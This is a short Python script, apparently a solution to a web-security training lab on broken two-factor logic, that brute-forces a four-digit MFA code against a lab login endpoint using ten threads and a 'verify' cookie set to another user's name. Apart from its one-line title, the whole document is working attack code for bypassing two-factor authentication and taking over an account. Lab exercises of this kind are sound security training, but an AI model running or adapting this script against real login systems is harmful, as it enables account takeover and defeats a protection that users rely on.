# Lab: 2FA broken logic

import requests
import threading
import os

url = "https://0ab300e203aa862e81d7bd99008000ac.web-security-academy.net/login2"

cookies = {
    "verify": "carlos",
    "session": "kamGJXYGWymwznsA6eDmcblCygKXxx6G"
}

def bruteforce(start, end):

    for i in range(start, end):

        code = str(i).zfill(4)

        r = requests.post(
            url,
            cookies=cookies,
            data = {
                "mfa-code": code
            },
            allow_redirects = False
        )

        print(f"Trying: {code}")

        if r.status_code == 302:
            print(f"\n[+] SUCCESS: {code}")
            
            os._exit(0)

#10 concurrent threads
for i in range(10):

    start = i * 1000
    end = start + 1000

    threading.Thread(
        target=bruteforce,
        args = (start, end)
    ).start()
